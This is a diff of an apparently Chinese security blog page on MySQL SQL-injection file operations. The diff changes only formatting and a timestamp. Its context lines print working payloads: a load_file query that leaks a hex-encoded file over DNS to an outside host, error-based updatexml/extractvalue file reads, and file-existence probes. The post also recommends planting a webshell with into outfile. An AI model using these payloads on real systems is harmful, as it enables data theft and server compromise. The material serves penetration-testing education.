@@ -105,7 +105,7 @@
 <meta property="og:image" content="http://blackwolfsec.cc/static/picture/mysql_file_3.png">
 <meta property="og:image" content="http://blackwolfsec.cc/static/picture/mysql_file_4.png">
 <meta property="og:image" content="http://blackwolfsec.cc/static/picture/mysql_file_5.png">
-<meta property="og:updated_time" content="2018-07-19T14:05:03.340Z">
+<meta property="og:updated_time" content="2018-07-19T14:11:31.089Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql SQL注入文件操作">
 <meta name="twitter:description" content="0x00 前言近期分析的mysql文件读写相关的利用方式，分享一下利用报错注入读取文件内容，利用LINES TERMINATED BY在查询只返回一个字段时写webshell文件，以及如何利用load_file扫描判断文件是否存在。">
@@ -432,15 +432,21 @@
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="keyword">load_file</span> (<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,<span class="keyword">hex</span>((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'D:/1.php'</span>))),<span class="string">'.t00ls.xxxxxxxxx.tu4.org\\a.txt'</span>))</span><br></pre></td></tr></table></figure>
 <h4 id="3-报错注入-load-file读文件"><a href="#3-报错注入-load-file读文件" class="headerlink" title="3. 报错注入+load_file读文件"></a>3. 报错注入+load_file读文件</h4><p>ps:<em>报错注入读文件内容，有时候会由于报错长度受限或者文件编码问题，推荐采用hex编码方式分段读取文件内容</em><br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>))),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure></p>
-<p> 某CMS报错注入读取文件实例1:<br> <img src="http://blackwolfsec.cc/static/picture/mysql_file_1.png" alt="image"></p>
-<p> 某CMS报错注入读取文件实例2:<br> <img src="http://blackwolfsec.cc/static/picture/mysql_file_2.png" alt="image"></p>
+<p> 某CMS报错注入读取文件实例1:</p>
+<p> <img src="http://blackwolfsec.cc/static/picture/mysql_file_1.png" alt="image"></p>
+<p> 某CMS报错注入读取文件实例2:</p>
+<p> <img src="http://blackwolfsec.cc/static/picture/mysql_file_2.png" alt="image"></p>
 <h2 id="0x03-扫描文件是否存在"><a href="#0x03-扫描文件是否存在" class="headerlink" title="0x03 扫描文件是否存在"></a>0x03 扫描文件是否存在</h2><ul>
 <li>要求用户具有file权限</li>
 <li>如果secure_file_priv非空，则只能扫描判断对应目录下的文件</li>
 </ul>
 <p><strong>原理：</strong><br>load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在</p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果文件存在，isnull(load_file('文件名'))返回0</span><br><span class="line">mysql&gt; select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~0~'</span><br><span class="line"></span><br><span class="line">如果文件不存在isnull(load_file('文件名'))返回1</span><br><span class="line">mysql&gt; select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/xxxxx')),0x7e),0);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~1~'</span><br></pre></td></tr></table></figure>
-<p> 某CMS报错注入扫描文件实例，存在文件C:/Windows/win.ini<br><img src="http://blackwolfsec.cc/static/picture/mysql_file_3.png" alt="image"><br> 某CMS报错注入扫描文件实例，不存在文件C:/Windows/passwd<br><img src="http://blackwolfsec.cc/static/picture/mysql_file_4.png" alt="image"><br>可以结合burp爆破扫描文件名<br><img src="http://blackwolfsec.cc/static/picture/mysql_file_5.png" alt="image"></p>
+<p> 某CMS报错注入扫描文件实例，存在文件C:/Windows/win.ini</p>
+<p><img src="http://blackwolfsec.cc/static/picture/mysql_file_3.png" alt="image"></p>
+<p> 某CMS报错注入扫描文件实例，不存在文件C:/Windows/passwd</p>
+<p><img src="http://blackwolfsec.cc/static/picture/mysql_file_4.png" alt="image"><br>可以结合burp爆破扫描文件名</p>
+<p><img src="http://blackwolfsec.cc/static/picture/mysql_file_5.png" alt="image"></p>
 <h2 id="0x04小结"><a href="#0x04小结" class="headerlink" title="0x04小结"></a>0x04小结</h2><ul>
 <li>倘若知道绝对路径且有权限时，通常都是直接into outfile写webshell</li>
 <li>不知道网站绝对路径时，可以尝试读取常见的配置文件获取网站绝对路径，然后进行写操作；或者直接读取敏感的文件，获取信息进行其他操作。</li>
